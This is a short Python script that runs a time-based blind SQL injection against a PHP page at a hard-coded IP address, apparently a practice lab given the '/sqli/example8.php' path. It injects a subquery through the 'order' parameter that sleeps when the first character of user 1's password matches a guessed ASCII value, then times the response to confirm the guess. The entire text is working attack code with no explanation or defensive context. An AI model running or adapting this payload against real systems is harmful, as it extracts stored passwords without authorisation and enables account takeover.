import requests
import time

sql = 'select sleep(3) from users where ASCII(SUBSTRING((SELECT passwd FROM users WHERE id=1), 1, 1))=97'
url = f"http://155.185.124.242/sqli/example8.php?order=`,({sql}) -- `"
print(url)

start_time = time.time()
requests.get(url)

if (time.time() - start_time) > 2:
    print('Success')